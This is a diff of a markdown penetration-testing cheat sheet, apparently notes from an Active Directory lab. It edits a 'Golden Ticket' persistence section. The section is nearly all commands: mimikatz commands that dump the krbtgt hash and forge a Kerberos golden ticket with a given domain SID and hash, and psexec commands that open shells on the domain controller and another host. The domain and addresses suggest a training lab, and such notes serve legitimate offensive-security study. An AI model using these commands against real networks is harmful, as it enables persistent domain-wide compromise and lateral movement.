@@ -416,30 +416,42 @@ klist
 ls \\web04\backup
 ```
 
-## Golden Ticket - Pass the Ticket (Forge own TGT)
+## DCOM (SKIPPED)
 
-- Get hash krbtgt
+# Persistence 
+
+## Golden Ticket - Pass the Ticket (get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, also known as golden tickets)
+
+- Get the NTLM hash of the krbtgt account, along with the domain SID
 ```
-./mimikatz.exe "privilege::debug"
-./mimikatz.exe "lsadump::lsa /patch"
+./mimikatz.exe privilege::debug
+./mimikatz.exe lsadump::lsa /patch
 ```
-- Get SID
+- Get domain SID
 ```
 GetDomainsid (PowerView)
 ```
-or  
+
+- generate the golden ticket let's launch mimikatz and delete any existing Kerberos tickets
 ```
-whoami /user
+./mimikatz.exe kerberos::purge
+```
+ 
+- Creating a golden ticket using Mimikatz
+```
+mimikatz.exe kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
 ```
 
-- Exploitation
+-With the golden ticket injected into memory, let's use PsExec_ to launch a new command prompt
 ```
-mimikatz.exe "kerberos::purge" "kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt" "misc::cmd"
+"misc::cmd"
+```
 
+- Run command prompt to access DC01 and X.70
+```
 psexec.exe \\dc1 cmd.exe
+psexec.exe \\192.168.50.70 cmd.exe
 ```
-
-
 
 
 # Tools Introduction
